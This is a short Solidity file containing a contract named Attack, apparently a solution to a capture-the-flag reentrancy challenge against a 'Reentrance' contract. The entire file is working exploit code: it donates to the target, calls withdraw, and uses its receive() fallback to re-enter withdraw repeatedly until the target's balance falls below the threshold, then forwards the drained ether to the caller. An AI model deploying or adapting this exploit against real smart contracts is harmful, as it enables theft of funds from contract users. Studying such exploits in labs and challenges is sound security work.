pragma solidity ^0.8.0;

import './Reentrancy.sol';
contract Attack{
    Reentrance R;
    function exploit(address payable _addr) public {
        R = Reentrance(_addr);
    }
    function callDonate()public payable{
        (bool success,) = address(R).call{value: msg.value }(abi.encodeWithSignature("donate(address)", this));
        
        require(success);
    }
    function withdraw()public{
        payable(msg.sender).transfer(address(this).balance);
    }
    // function getBalance() public payable{
    //     payable(msg.sender).transfer(address(this).balance);
    // }
    function attack()public{
        R.withdraw(1000000000000000 wei);
    }
    receive() external payable{
        if(address(R).balance >= 1000000000000000 wei){        
            R.withdraw(1000000000000000 wei);
        }
    }    

}